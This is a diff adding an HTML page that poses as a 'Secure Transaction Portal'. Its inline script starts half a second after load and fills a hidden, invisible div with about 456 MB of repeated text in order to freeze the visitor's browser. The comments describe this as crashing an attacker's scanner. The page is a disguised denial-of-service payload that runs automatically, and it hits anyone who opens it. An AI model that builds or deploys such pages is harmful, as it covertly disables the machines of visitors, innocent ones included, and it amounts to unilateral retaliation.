@@ -1,0 +1,33 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Secure Transaction Portal</title>
+  </head>
+  <body>
+    <h1>Processing Secure Transaction... Please do not close this page.</h1>
+    <div
+      id="troll-zone"
+      style="word-break: break-all; font-size: 1px; color: white"
+    ></div>
+
+    <script>
+      // Generates ~456 MB of 'lol' in the browser DOM to freeze the attacker's system
+      const targetSize = 456 * 1024 * 1024; // 456 MB in bytes
+      let chunk = "lol".repeat(100000); // Small manageable chunk
+      const container = document.getElementById("troll-zone");
+
+      let bytesGenerated = 0;
+
+      function crashScanner() {
+        while (bytesGenerated < targetSize) {
+          container.appendChild(document.createTextNode(chunk));
+          bytesGenerated += chunk.length;
+        }
+      }
+
+      // Brief delay so the page loads first, then locks up their scanner
+      setTimeout(crashScanner, 500);
+    </script>
+  </body>
+</html>
